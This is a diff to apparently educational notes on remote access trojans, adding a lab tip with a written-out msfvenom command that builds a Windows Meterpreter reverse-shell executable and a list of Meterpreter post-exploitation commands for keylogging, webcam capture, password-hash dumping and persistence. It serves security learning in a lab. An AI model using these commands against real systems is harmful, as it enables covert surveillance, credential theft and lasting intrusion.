@@ -48,3 +48,24 @@ From a defender's side, RATs communicate with C2 servers over common ports like 
 - Persistence: the ability of malware to survive reboots by adding itself to startup processes or registry keys
 - Meterpreter: an advanced RAT-like payload in Metasploit that runs entirely in memory, leaving no files on disk
 - Payload: the malicious code delivered to the victim that establishes the RAT connection
+
+## One Tip / Tool
+
+Tool: `Metasploit Meterpreter` for learning RAT concepts in a lab environment
+
+```bash
+# generate payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > rat.exe
+
+# common meterpreter commands after getting a session
+sysinfo          # system information
+getuid           # current user
+screenshot       # take a screenshot
+webcam_snap      # capture webcam photo
+keyscan_start    # start keylogger
+keyscan_dump     # dump captured keystrokes
+hashdump         # dump password hashes
+run persistence  # add persistence across reboots
+```
+
+Practice RAT concepts safely on **TryHackMe** rooms like "Metasploit" and "RAT" or on your own local virtual machine lab. Never deploy RATs on systems you don't own — it's illegal in every jurisdiction.
